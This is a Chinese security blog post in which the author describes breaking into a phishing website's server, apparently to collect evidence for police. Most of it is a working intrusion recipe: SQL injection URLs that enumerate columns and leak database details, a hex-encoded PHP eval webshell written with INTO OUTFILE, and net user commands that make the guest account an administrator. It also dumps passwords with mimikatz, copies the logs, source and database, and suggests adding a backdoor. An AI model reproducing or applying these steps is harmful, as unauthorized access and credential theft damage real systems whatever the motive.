---
layout: post
title:  "[Web安全]记一次钓鱼网站调查取证"
date:   2018-07-14 9:51
categories: jekyll
permalink: /archivers/Traceability-go-fishing-website-20180714
---

##0x00 前言

  前段时间加了个设计群,某人说朋友被骗钱在群里吐了两天苦水,原先真不打算管这事,没太多时间管闲事.无奈昨晚下了场大雨,没办法出门跑步,一时技痒就顺道把钓鱼站黑了顺道把网站日志跟服务器登陆日志打包出来.所以有了这篇文章记录一下过程.

##0x01 溯源准备

  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714100404.jpg)

###1.1 开始

看到链接下看到后缀php?uid=,初步判断应该是php+mysql的网站..复制链接到电脑浏览器打开后下意识职业病uid=87'
  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714101207.png)
  ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714101745.png)
###1.2 爆出路径,可能存在sql注入
得到路径D:\xxxxx\zz\index.php，加上header头数据初步判断得出是Windows+Apache+Php+Mysql的网站,能爆路径很概率会有Sql注入,我们先记录下来路径是D:\xxxxx\
>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=1 //返回正常

>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 //返回错误

![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714103406.png)

![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/8f83af916f494821bc2980ac6d539759.jpeg)

###1.3 有sql注入

本来想掏出SQLMAP一把梭,结果sqlmap居然没注入出来..可能是我的操作有问题..只能手工注入了.

###1.4 猜字段数目,当尝试注入语句字段个数为26返回正确,27返回错误,说明字段数等于26.

>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 order by 26 //返回正常

>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 order by 27 //返回错误

![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714104806.png)

###1.5 联合查询语句，暴出可显示字段

>http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,
>14,15,16,17,18,19,20,21,22,23,24,25,26

###1.6 暴出数据库用户、版本、库名和路径信息.

>system_user() 系统用户名
>user() 用户名
>current_user当前用户名
>session_user()连接数据库的用户名
>database() 数据库名
>version() MYSQL 数据库版本
>load_file() MYSQL 读取本地文件的函数
>@@datadir 读取数据库路径
>@@basedir MYSQL 安装路径
>@@version_compile_os 操作系统 

>http://www.xxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,user(),database(),7,8,version(),10,11,12,@@basedir,14,15,16,17,18,19,20,21,22,23,24,25,26
![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714122723.png)

运气不错是root权限,不用大费周章跑去后台传马,直接写,记录信息root@localhost^^5.5.40^^xxxx^^D:/phpStudy/MySQL/

###1.7 写入webshell

结合我们刚才爆出的网站路径D:\xxxxx\zz\ 
php一句话<?php eval($_POST['test'])?>
去https://www.107000.com/T-Hex/ 转成hex16进制加上0x
得出写入webhsell语句.

>http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,0x3C3F706870206576616C28245F504F53545B2774657374275D293F3E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 into outfile 'D:/xxxxx/zz/weiho.php'


###1.8 提升权限

![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714124904.png)
连接上去看一下权限,Administrator..典型phpstudy安装完啥也不管直接把站丢上去的情况..还想着要不Mysql UDF或者MOF提权.这里接下来有两种做法,直接启用guest,添加密码以及管理员权限.第二种下个wce读取明文,以administrator的权限登陆.Ps:wce需要管理员或管理员以上的权限才可以,一般情况下配合本地提权exploit,但这里是Administrator.可以忽略掉要提权的操作.不过我们这里选前者,直接启用guest账号.先查看下对方在不在VPS里.状态:断开.
>query users //查看登陆
>
>用户名                会话名             ID  状态    空闲时间   登录时间
>
>administrator                             2  断开      1+21:09  2018/7/11 23:15
>
>net user guest /active:yes &net localgroup administrators guest /add & net user guest weiho4444@
>
>命令成功完成。
>

###1.9 登陆远程桌面

>nmap -sS -A -v -p- --open xxxx.cn

我进来这服务器前用nmap大概扫了一下.有三个端口开放80,3306,3389.本来想爆破3306.telnet过去没到三秒结束会话,后面登陆才发现设置了IP.3389一般是远程桌面的端口.直接本地连过去就行了.
运行远程桌面
>mstsc

###1.10 读取明文密码

https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20180616
先下载回来,由于这VPS是x86系统所以运行x86的mimikatz

Ps:一定要是管理员权限才能运行.
>privilege::debug
>
>sekurlsa::logonpasswords
![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714135136.png)

得到管理员administrator密码540cxxxxxx.把自己账号禁了,以管理员进去.


##0x02 开始溯源

###2.1 拷贝系统日志Security和System

>C:\Windows\System32\winevt\Logs

###2.2 Apache日志 error.log

>"C:\Program Files\WinRAR\Rar.exe" a -k -r -s -m1 D:\xxxxxx\error.rar D:\phpStudy\Apache\logs

###2.3 打包网站源码

>"C:\Program Files\WinRAR\Rar.exe" a -k -r -s -m1 D:\xxxxxx\1.rar D:\xxxxx\

###2.4 导出mysql数据库

mysqldump -uroot -proot123456 dbname > D:\xxxxx\dbname.sql


![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714141302.png)

##0x03 后话

  把数据打包后,让那哥们交民警结果人家民警同志不信..说我数据可能伪造.我说让民警直接联系我吧,然后blabla不了了之,就立了案.OMG.大写服气.后面让玄道转交给江苏的网警同志.今天(7.14)记录一下昨晚(7.13)的大概过程.中间省略了一些不太必要的过程.后续可以做的事,分析apache以及系统日志.做个后门记录远程桌面访问的IP,以及iframe之类的引用插入后台相关地址记录.查看web服务器日志得到对应IP.

##0x04

>参考资料
>
>[一个PHP+Mysql手工注入例子](https://blog.csdn.net/praifire/article/details/51926863)
>
>[Mysql注入方式](https://www.cnblogs.com/0x03/p/7451292.html)
>
>[Hex编码解码](https://www.107000.com/T-Hex/)
>
>[caidao](https://github.com/pythonsky/caidao-20160620-www.maicaidao.com)

>[mimikatz](https://github.com/gentilkiwi/mimikatz)

>[使用mimikatz_trunk获取计算机密码](https://jingyan.baidu.com/album/e52e36154c3ff140c70c515f.html)
